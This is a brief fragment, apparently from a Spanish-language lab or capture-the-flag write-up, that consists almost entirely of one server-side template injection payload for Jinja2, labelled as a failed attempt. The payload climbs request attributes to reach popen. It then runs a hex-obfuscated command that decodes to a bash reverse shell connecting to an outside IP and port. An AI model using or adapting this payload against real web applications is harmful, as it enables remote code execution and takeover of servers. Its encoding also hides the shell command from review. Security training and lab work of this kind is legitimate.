...
```
```
Payload Fallido: {{ request|attr("application")|
...
attr("popen")("echo ”\x62\x61\x73\x68\x20\x2d\x69\x20\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x31\x30\x2e\x38\x2e\x31\x32\x33\x2e\x31\x39\x34\x2f\x31\x38\x30\x30\x20\x30\x3e\x26\x31” |
bash")|attr("read")() }} 
```
